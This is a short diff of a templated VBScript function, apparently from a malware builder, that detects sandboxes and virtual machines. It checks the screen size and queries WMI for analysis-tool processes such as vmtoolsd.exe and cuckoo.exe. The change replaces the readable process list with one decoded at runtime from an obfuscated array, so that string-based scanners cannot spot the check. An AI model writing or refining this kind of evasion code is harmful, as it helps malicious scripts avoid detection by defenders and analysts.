@@ -44,7 +44,7 @@ Function {{ v.fn_sandbox }}()
     If Screen.Width < 800 Or Screen.Height < 600 Then {{ v.fn_sandbox }} = True: Exit Function
     Dim wmi: Set wmi = GetObject({{ v.fn_build_str }}(Array({{ v.jsc_winmgmts }})))
     Dim procs: Set procs = wmi.ExecQuery("SELECT Name FROM Win32_Process")
-    Dim badList: badList = Array("vmtoolsd.exe","vboxservice.exe","cuckoo.exe","vmsrvc.exe","qemu-ga.exe","prl_tools.exe","xenservice.exe","sandboxiedcomlaunch.exe","vmusrvc.exe")
+    Dim badList: badList = Split({{ v.fn_build_str }}(Array({{ v.jsc_vm_procs }})), "|")
     Dim p, j
     For Each p In procs
         Dim pn: pn = LCase(p.Name)
